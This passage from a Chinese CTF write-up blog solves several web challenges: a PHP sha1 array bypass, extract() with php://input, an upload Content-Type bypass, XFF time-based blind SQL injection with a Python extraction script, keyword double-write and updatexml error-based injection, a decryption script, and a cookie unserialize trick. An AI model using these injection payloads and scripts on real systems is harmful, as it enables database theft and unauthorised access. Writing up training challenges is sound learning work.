<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = urldecode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);
<span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])) &#123;
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;uname&#x27;</span>] == <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])

        <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;passwd can not be uname.&#x27;</span>;

    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]) === sha1(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])&amp;(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]==<span class="hljs-string">&#x27;margin&#x27;</span>))

        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);

    <span class="hljs-keyword">else</span>

        <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;sorry!&#x27;</span>;

&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>首先看一下要传入哪些变量</p>
<p>get:id uname</p>
<p>post:passwd</p>
<p>id需要进行一次urldecode，解码的值为margin</p>
<p>uname与passwd不相同，但是sha1值要相同，并且是严格相等 ===，这里可以使用sha1函数的漏洞，无法处理数组类型的变量，最后会返回0，也可以用sha1强碰撞。</p>
<p>payload</p>
<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">urlencode</span>(margin)=%<span class="hljs-number">6</span>D%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">67</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>E
<span class="hljs-attribute">uname</span>[]=<span class="hljs-number">1</span>
<span class="hljs-attribute">passwd</span>[]=<span class="hljs-number">2</span>

<span class="hljs-attribute">GET</span>: id=%<span class="hljs-number">6</span>D%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">67</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>E&amp;uname[]=<span class="hljs-number">1</span>
<span class="hljs-attribute">POST</span>:passwd[]=<span class="hljs-number">2</span></code></pre></div>

<p><img src="https://i.loli.net/2020/11/23/MPLxeWwG2BIYHbf.png" srcset="/img/loading.gif" alt></p>
<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
extract(<span class="hljs-variable">$_GET</span>);
<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$ac</span>))
&#123;
<span class="hljs-variable">$f</span> = trim(file_get_contents(<span class="hljs-variable">$fn</span>));
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$ac</span> === <span class="hljs-variable">$f</span>)
&#123;
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;This is flag:&quot;</span> .<span class="hljs-string">&quot; <span class="hljs-subst">$flag</span>&lt;/p&gt;&quot;</span>;
&#125;
<span class="hljs-keyword">else</span>
&#123;
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;</span>;
&#125;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p><strong>extract</strong>函数作用</p>
<p>(PHP 4, PHP 5, PHP 7)</p>
<p>extract — 从数组中将变量导入到当前的符号表</p>
<p>说明</p>
<p>extract ( array <code>&amp;$array</code> [, int <code>$flags</code> = EXTR_OVERWRITE [, string <code>$prefix</code> = <strong><code>NULL</code></strong> ]] ) : int</p>
<p>本函数用来将变量从数组中导入到当前的符号表中。</p>
<p>检查每个键名看是否可以作为一个合法的变量名，同时也检查和符号表中已有的变量名的冲突。</p>
<p><strong>trim</strong></p>
<p>(PHP 4, PHP 5, PHP 7)</p>
<p>trim — 去除字符串首尾处的空白字符（或者其他字符）</p>
<p>说明</p>
<p>trim ( string <code>$str</code> [, string <code>$character_mask</code> = “ \t\n\r\0\x0B” ] ) : string</p>
<p>此函数返回字符串 <code>str</code> 去除首尾空白字符后的结果。如果不指定第二个参数，<strong>trim()</strong> 将去除这些字符：</p>
<ul>
<li>“ “ (ASCII <code>32</code> (<code>0x20</code>))，普通空格符。</li>
<li>“\t” (ASCII <code>9</code> (<code>0x09</code>))，制表符。</li>
<li>“\n” (ASCII <code>10</code> (<code>0x0A</code>))，换行符。</li>
<li>“\r” (ASCII <code>13</code> (<code>0x0D</code>))，回车符。</li>
<li>“\0” (ASCII <code>0</code> (<code>0x00</code>))，空字节符。</li>
<li>“\x0B” (ASCII <code>11</code> (<code>0x0B</code>))，垂直制表符。</li>
</ul>
<p><strong>file_get_contents</strong></p>
<p>(PHP 4 &gt;= 4.3.0, PHP 5, PHP 7)</p>
<p>file_get_contents — 将整个文件读入一个字符串</p>
<p>代码的大致含义就是</p>
<p>get方式提交参数，用extract函数将变量写入符号表中，如果get提交的参数中包含$ac，则利用file_get_content函数从文件中读取内容并赋值给$f,如果$ac===$f则拿到flag</p>
<p>这里需要利用php的伪协议写入内容 php://input</p>
<p>payload</p>
<div class="hljs"><pre><code class="hljs dts"><span class="hljs-symbol">GET:</span> ac=<span class="hljs-number">111</span><span class="hljs-variable">&amp;fn</span>=php:<span class="hljs-comment">//input</span>
<span class="hljs-symbol">POST:</span> <span class="hljs-number">111</span></code></pre></div>



<h2 id="细心"><a href="#细心" class="headerlink" title="细心"></a>细心</h2><p>题目网站崩了</p>
<h2 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a>求getshell</h2><p>文件上传</p>
<p>首先先上传一个图片文件，上传成功了并返回保存路径</p>
<p>再上传一个php的文件，提示<code>Invalid file</code></p>
<p>上传.htaccess, .user.ini都提示<code>you got it</code></p>
<p>两种提示不一样猜测可能存在后缀黑名单和文件类型检测。</p>
<p>上传一个php5文件并bp抓包修改MIME(Content-Type)为 image/.jpeg还是提示invalid file </p>
<p><img src="https://i.loli.net/2020/11/23/FgbfWmJIoNxpw7V.png" srcset="/img/loading.gif" alt="getshell1.png"></p>
<p>再修改请求头部的Content-Type，利用大小写绕过，成功拿到flag</p>
<p><img src="https://i.loli.net/2020/11/23/w2bYAuHngShyXCI.png" srcset="/img/loading.gif" alt="getshell2.png"></p>
<p>考察知识点：</p>
<p><strong>请求中的Content-Type</strong></p>
<p>在请求中 (如POST 或 PUT)，Content-Type字段用于客户端告诉服务器实际发送的数据类型。当你发送一个HTTP的POST请求时，需要设置请求头中的Content-Type字段，告诉服务端你发送的数据是什么类型的。</p>
<p><strong>设置请求头中的Content-Type</strong></p>
<p>当客户端向服务端发起HTTP的POST请求时，需要告诉服务端，我们发送的数据类型，方便服务端去解析数据。如果你不设置，那么服务端可能无法处理你的请求。</p>
<h2 id="INSERT-INTO注入"><a href="#INSERT-INTO注入" class="headerlink" title="INSERT INTO注入"></a>INSERT INTO注入</h2><p>提示了insert into注入</p>
<p>并给出了源码</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getIp</span>(<span class="hljs-params"></span>)</span>&#123;
<span class="hljs-variable">$ip</span> = <span class="hljs-string">&#x27;&#x27;</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]))&#123; <span class="hljs-comment">//判断是否存在xxf</span>
<span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];		<span class="hljs-comment">//存在则优先使用xxf</span>
&#125;<span class="hljs-keyword">else</span>&#123;
<span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];				<span class="hljs-comment">//remote_addr	</span>
&#125;
<span class="hljs-variable">$ip_arr</span> = explode(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$ip</span>);				<span class="hljs-comment">//过滤 ,</span>
<span class="hljs-keyword">return</span> <span class="hljs-variable">$ip_arr</span>[<span class="hljs-number">0</span>];

&#125;

<span class="hljs-variable">$host</span>=<span class="hljs-string">&quot;localhost&quot;</span>;
<span class="hljs-variable">$user</span>=<span class="hljs-string">&quot;&quot;</span>;
<span class="hljs-variable">$pass</span>=<span class="hljs-string">&quot;&quot;</span>;
<span class="hljs-variable">$db</span>=<span class="hljs-string">&quot;&quot;</span>;

<span class="hljs-variable">$connect</span> = mysql_connect(<span class="hljs-variable">$host</span>, <span class="hljs-variable">$user</span>, <span class="hljs-variable">$pass</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to connect&quot;</span>);<span class="hljs-comment">//连接数据库</span>

mysql_select_db(<span class="hljs-variable">$db</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to select database&quot;</span>);

<span class="hljs-variable">$ip</span> = getIp();
<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;your ip is :&#x27;</span>.<span class="hljs-variable">$ip</span>;
<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;insert into client_ip (ip) values (&#x27;<span class="hljs-subst">$ip</span>&#x27;)&quot;</span>; <span class="hljs-comment">//注入点</span>
mysql_query(<span class="hljs-variable">$sql</span>);
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>网页显示出自己的ip地址，想到的是xff头，修改了xff头的内容后，页面回显也会改变，所以就是xff注入。</p>
<p>抓包添加xxf头，并构造注入语句,这里因为过滤了逗号，所以无法使用if语句，又因为没有回显所以要使用基于时间的盲注</p>
<div class="hljs"><pre><code class="hljs awk"><span class="hljs-variable">$ip_arr</span> = explode(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$ip</span>);   <span class="hljs-regexp">//</span>过滤了,</code></pre></div>

<p>代替if的注入语句如下</p>
<div class="hljs"><pre><code class="hljs ada"><span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> 语句<span class="hljs-number">1</span> <span class="hljs-keyword">then</span> 语句<span class="hljs-number">2</span> <span class="hljs-keyword">else</span> 语句<span class="hljs-number">3</span> <span class="hljs-keyword">end</span>;
//含义很好理解，就是当语句<span class="hljs-number">1</span>为真时，执行语句<span class="hljs-number">2</span>，否则执行语句<span class="hljs-number">3</span></code></pre></div>

<p>所以要构造的注入语句为</p>
<div class="hljs"><pre><code class="hljs n1ql">11&#x27;+(<span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> <span class="hljs-built_in">length</span>(<span class="hljs-keyword">database</span>())=<span class="hljs-number">5</span> <span class="hljs-keyword">then</span> sleep(<span class="hljs-number">5</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">end</span>))%<span class="hljs-number">23</span>
//当数据库名的长度为<span class="hljs-number">5</span>时，则执行sleep(<span class="hljs-number">5</span>)，否则结束，这样就可以根据网页的响应时间来判断查询语句是否正确</code></pre></div>

<p>带入原语句</p>
<div class="hljs"><pre><code class="hljs n1ql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> client_ip (ip) <span class="hljs-keyword">values</span> (<span class="hljs-string">&#x27;$ip&#x27;</span>)
<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> client_ip (ip) <span class="hljs-keyword">values</span> (<span class="hljs-string">&#x27;11&#x27;</span>+(<span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> <span class="hljs-built_in">length</span>(<span class="hljs-keyword">database</span>())=<span class="hljs-number">5</span> <span class="hljs-keyword">then</span> sleep(<span class="hljs-number">5</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">end</span>))%<span class="hljs-number">23</span>
//可以看到语句成功注入到原查询语句中，并可以正常执行</code></pre></div>

<p>判断字段每一个字符的值</p>
<p>常用的语句应该为</p>
<div class="hljs"><pre><code class="hljs ada"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> (<span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> (substr(<span class="hljs-keyword">select</span> database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;c&#x27;</span> <span class="hljs-keyword">then</span> sleep(<span class="hljs-number">5</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">1</span> <span class="hljs-keyword">end</span>) #</code></pre></div>

<p>但是因为逗号被过滤了，所以改为下面的语句</p>
<div class="hljs"><pre><code class="hljs ada"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> (<span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> (substr(<span class="hljs-keyword">select</span> database()) from <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;c&#x27;</span> <span class="hljs-keyword">then</span> sleep(<span class="hljs-number">5</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">1</span> <span class="hljs-keyword">end</span>) #</code></pre></div>



<div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding:utf-8 -*-</span>
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> sys
<span class="hljs-comment">#sql = &#x27;127.0.0.1&#x27;+(select case when substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from &#123;0&#125; for 1)=&#x27;&#123;1&#125;&#x27;) then sleep(5) else 0 end) --+</span>

<span class="hljs-comment">##client_ip,flag</span>

<span class="hljs-comment">#sql = &#x27;127.0.0.1&#x27;+(select case when substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27; from &#123;0&#125; for 1)=&#x27;&#123;1&#125;&#x27;) then sleep(5) else 0 end) --+</span>

sql = <span class="hljs-string">&quot;127.0.0.1&#x27;+(select case when substr((select flag from flag) from &#123;0&#125; for 1)=&#x27;&#123;1&#125;&#x27; then sleep(5) else 0 end))-- +&quot;</span>
url = <span class="hljs-string">&#x27;http://123.206.87.240:8002/web15/&#x27;</span>
flag = <span class="hljs-string">&#x27;&#x27;</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">40</span>):
    print(<span class="hljs-built_in">str</span>(i))
    <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">129</span>):
        <span class="hljs-keyword">if</span> ch == <span class="hljs-number">128</span>:
            sys.exit(<span class="hljs-number">0</span>)
        sqli = sql.<span class="hljs-built_in">format</span>(i, <span class="hljs-built_in">chr</span>(ch))
        header = &#123;
            <span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>: sqli
        &#125;
        <span class="hljs-keyword">try</span>:
            html = requests.get(url, headers=header, timeout=<span class="hljs-number">3</span>) <span class="hljs-comment">#响应时间超过3秒则 进入except 即可猜测是正确的</span>
        <span class="hljs-keyword">except</span>:
            flag += <span class="hljs-built_in">chr</span>(ch)
            print(flag)
            <span class="hljs-keyword">break</span></code></pre></div>



<h2 id="这是一个神奇的登陆框"><a href="#这是一个神奇的登陆框" class="headerlink" title="这是一个神奇的登陆框"></a>这是一个神奇的登陆框</h2><p>网址打不开</p>
<h2 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h2><p>tips</p>
<blockquote>
<p>本题有2个flag<br>flag均为小写<br>flag格式 flag{}</p>
</blockquote>
<p>看到题目提示，应该是二次注入</p>
<p>url中存在id参数，再id参数后加 ‘后页面报错，再加上#后显示 <code>There is nothing</code></p>
<p>输入 id=1’or 1=1–+ 报错</p>
<p>但是输入id=1’oorr 1=1–+ 时正常了，说明存在关键词过滤，通过异或注入发现过滤了union,select,and,or等关键词，可以用双写绕过。</p>
<div class="hljs"><pre><code class="hljs matlab"><span class="hljs-number">1</span>&#x27;^(<span class="hljs-built_in">length</span>(<span class="hljs-string">&#x27;union&#x27;</span>)!=<span class="hljs-number">0</span>)--+
页面显示错误正常说明<span class="hljs-built_in">length</span>(<span class="hljs-string">&#x27;union&#x27;</span>)!=<span class="hljs-number">0</span>是错的，即<span class="hljs-built_in">length</span>(<span class="hljs-string">&#x27;union&#x27;</span>)=<span class="hljs-number">0</span>，说明union替换为空了
其他关键词的测试也类似</code></pre></div>

<p>开始注入</p>
<div class="hljs"><pre><code class="hljs pgsql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27; ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()--+</span>
<span class="hljs-string"></span>
<span class="hljs-string">database:flag1,hint</span>
<span class="hljs-string"></span>
<span class="hljs-string">-1&#x27;</span> ununionion seselectlect <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> infoorrmation_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;flag1&#x27;</span><span class="hljs-comment">--+</span>
<span class="hljs-keyword">table</span>:flag1,address
<span class="hljs-number">-1</span><span class="hljs-string">&#x27; ununionion seselectlect 1,group_concat(flag1) from flag1 --+</span>
<span class="hljs-string">usOwycTju+FTUUzXosjr 解码为：好吧你会SQL注入</span>
<span class="hljs-string">-1&#x27;</span> ununionion seselectlect <span class="hljs-number">1</span>,group_concat(address) <span class="hljs-keyword">from</span> flag1 <span class="hljs-comment">--+</span>
拿到下一关的地址
</code></pre></div>

<p><img src="https://i.loli.net/2020/11/23/uMT6Q7oaNHJEcbv.png" srcset="/img/loading.gif" alt="sqls-1.png"></p>
<p>同样存在一个注入点id，加单引号发现提示了报错信息，很明显是报错注入</p>
<p><img src="https://i.loli.net/2020/11/23/KBepFMZsYRPHaW8.png" srcset="/img/loading.gif" alt="sqls-2.png"></p>
<p>报错注入一般是固定的模板</p>
<p>下面使用updatexml()进行注入</p>
<blockquote>
<p>函数语法：updatexml(XML_document, XPath_string, new_value);</p>
<p>适用版本: 5.1.5+<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值</p>
<p>我们通常在第二个xpath参数填写我们要查询的内容。</p>
</blockquote>
<p>payload</p>
<div class="hljs"><pre><code class="hljs pgsql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(&#x27;</span>~<span class="hljs-string">&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&#x27;</span>~<span class="hljs-string">&#x27;),3) %23</span>
<span class="hljs-string">database:~class,flag2~</span>
<span class="hljs-string"> </span>
<span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;flag2&#x27;</span>),<span class="hljs-string">&#x27;~&#x27;</span>),<span class="hljs-number">3</span>) %<span class="hljs-number">23</span>
<span class="hljs-keyword">table</span>:~flag2,address~
# 查数据
?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(&#x27;</span><span class="hljs-number">0x7e</span><span class="hljs-string">&#x27;,(select flag2 from flag2),&#x27;</span><span class="hljs-number">0x7e</span><span class="hljs-string">&#x27;),3) %23</span>
<span class="hljs-string"> 拿到真正的flag</span></code></pre></div>

<p><img src="https://i.loli.net/2020/11/23/QwtPgsAriuMOGLB.png" srcset="/img/loading.gif" alt="sqls-flag.png"></p>
<h2 id="PHP-encrypt-1-ISCCCTF"><a href="#PHP-encrypt-1-ISCCCTF" class="headerlink" title="PHP_encrypt_1(ISCCCTF)"></a>PHP_encrypt_1(ISCCCTF)</h2><p>题目给了源码分析可知是一个加密过程，并且给了加密后的字符串，所以写出解密脚本即可</p>
<p>加密后的数据为</p>
<div class="hljs"><pre><code class="hljs abnf"><span class="hljs-attribute">fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA</span>=</code></pre></div>

<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params"><span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span></span>)</span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-variable">$key</span> = md5(<span class="hljs-string">&#x27;ISCC&#x27;</span>);
    <span class="hljs-variable">$x</span> = <span class="hljs-number">0</span>;
    <span class="hljs-variable">$len</span> = strlen(<span class="hljs-variable">$data</span>);
    <span class="hljs-variable">$klen</span> = strlen(<span class="hljs-variable">$key</span>);
    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len</span>; <span class="hljs-variable">$i</span>++) &#123; 
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$x</span> == <span class="hljs-variable">$klen</span>)
        &#123;
            <span class="hljs-variable">$x</span> = <span class="hljs-number">0</span>;
        &#125;
        <span class="hljs-variable">$char</span> .= <span class="hljs-variable">$key</span>[<span class="hljs-variable">$x</span>];
        <span class="hljs-variable">$x</span>+=<span class="hljs-number">1</span>;
    &#125;
    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len</span>; <span class="hljs-variable">$i</span>++) &#123;
        <span class="hljs-variable">$str</span> .= chr((ord(<span class="hljs-variable">$data</span>[<span class="hljs-variable">$i</span>]) + ord(<span class="hljs-variable">$char</span>[<span class="hljs-variable">$i</span>])) % <span class="hljs-number">128</span>);
    &#125;
    <span class="hljs-keyword">return</span> base64_encode(<span class="hljs-variable">$str</span>);
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>解密脚本如下</p>
<div class="hljs"><pre><code class="hljs php">

<span class="hljs-meta">&lt;?php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-variable">$key</span> = md5(<span class="hljs-string">&#x27;ISCC&#x27;</span>);  <span class="hljs-comment">// 对密钥进行md5加密</span>
    <span class="hljs-variable">$x</span>=<span class="hljs-number">0</span>;
    <span class="hljs-variable">$str</span>=base64_decode(<span class="hljs-variable">$str</span>); <span class="hljs-comment">//对加密后的字符串base64解码</span>
    <span class="hljs-variable">$len</span>=strlen(<span class="hljs-variable">$str</span>);     
    <span class="hljs-variable">$klen</span>=strlen(<span class="hljs-variable">$key</span>);

    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable">$len</span>;<span class="hljs-variable">$i</span>++)   <span class="hljs-comment">//计算出char字符数组，用于最后的减操作</span>
    &#123;
        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>==<span class="hljs-variable">$klen</span>)
        &#123;
            <span class="hljs-variable">$x</span>=<span class="hljs-number">0</span>;
        &#125;
        <span class="hljs-variable">$char</span>.=<span class="hljs-variable">$key</span>[<span class="hljs-variable">$x</span>];
        <span class="hljs-variable">$x</span>+=<span class="hljs-number">1</span>;
    &#125;
    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable">$len</span>;<span class="hljs-variable">$i</span>++)
    &#123;
        <span class="hljs-variable">$data</span>.=chr((ord(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$i</span>])-ord(<span class="hljs-variable">$char</span>[<span class="hljs-variable">$i</span>])+<span class="hljs-number">128</span>)%<span class="hljs-number">128</span>);  <span class="hljs-comment">//加上128为了防止出现负数。</span>
    &#125;
    <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;
&#125;
<span class="hljs-keyword">echo</span>(decode(<span class="hljs-string">&#x27;fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=&#x27;</span>));
<span class="hljs-meta">?&gt;</span>
</code></pre></div>

<p><img src="https://i.loli.net/2020/11/23/DEs3N8y7ngdKovb.png" srcset="/img/loading.gif" alt="encode.png"></p>
<h2 id="文件包含2"><a href="#文件包含2" class="headerlink" title="文件包含2"></a>文件包含2</h2><p>网址打不开</p>
<h2 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h2><p>给了提示hint，猜测可能是要提交的参数，get提交hint,显示源码</p>
<div class="hljs"><pre><code class="hljs php+HTML">&lt;?php
error_reporting(0);
include_once(&quot;flag.php&quot;);
$cookie &#x3D; $_COOKIE[&#39;ISecer&#39;];  &#x2F;&#x2F;含cookie 可能需要抓包修改cookie
if(isset($_GET[&#39;hint&#39;]))&#123;
    show_source(__FILE__);
&#125;
elseif (unserialize($cookie) &#x3D;&#x3D;&#x3D; &quot;$KEY&quot;) &#x2F;&#x2F;如果反序列化后的$cookie&#x3D;&#x3D;&#x3D;$KEY 拿到flag
&#123;                                           
    echo &quot;$flag&quot;;
&#125;
else &#123;
?&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;&gt;
&lt;title&gt;Login&lt;&#x2F;title&gt;
&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;admin.css&quot; type&#x3D;&quot;text&#x2F;css&quot;&gt;
&lt;&#x2F;head&gt;
&lt;body&gt;
&lt;br&gt;
&lt;div class&#x3D;&quot;container&quot; align&#x3D;&quot;center&quot;&gt;
  &lt;form method&#x3D;&quot;POST&quot; action&#x3D;&quot;#&quot;&gt;
    &lt;p&gt;&lt;input name&#x3D;&quot;user&quot; type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;Username&quot;&gt;&lt;&#x2F;p&gt;
    &lt;p&gt;&lt;input name&#x3D;&quot;password&quot; type&#x3D;&quot;password&quot; placeholder&#x3D;&quot;Password&quot;&gt;&lt;&#x2F;p&gt;
    &lt;p&gt;&lt;input value&#x3D;&quot;Login&quot; type&#x3D;&quot;button&quot;&#x2F;&gt;&lt;&#x2F;p&gt;
  &lt;&#x2F;form&gt;
&lt;&#x2F;div&gt;
&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;

&lt;?php
&#125;
$KEY&#x3D;&#39;ISecer:www.isecer.com&#39;;
?&gt;</code></pre></div>

<p>代码审计完后思路很简单就是cookie注入，而且$KEY的值下面也已经给了</p>
<p>直接构造</p>
<div class="hljs"><pre><code class="hljs ini"><span class="hljs-attr">ISecer</span>=s:<span class="hljs-number">21</span>:<span class="hljs-string">&quot;ISecer:www.isecer.com&quot;</span><span class="hljs-comment">;</span></code></pre></div>

<p>但是会发现并没有显示flag，这是因为这题给出的$KEY是迷惑人的，下面这段php代码与上面没关系，就是说明上面代码中$KEY为NULL</p>
<p>所以真正的payload：</p>
<div class="hljs"><pre><code class="hljs ini"><span class="hljs-attr">ISecer</span>=s:<span class="hljs-number">0</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-comment">;</span></code></pre></div>

<p>请求头</p>
<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /flagphp/ HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>
<span class="hljs-attribute">Host</span>: <span class="hljs-number">123.206.87.240:8002</span>
<span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; WOW<span class="hljs-number">64</span>; rv:<span class="hljs-number">46</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">46</span>.<span class="hljs-number">0</span>
<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>
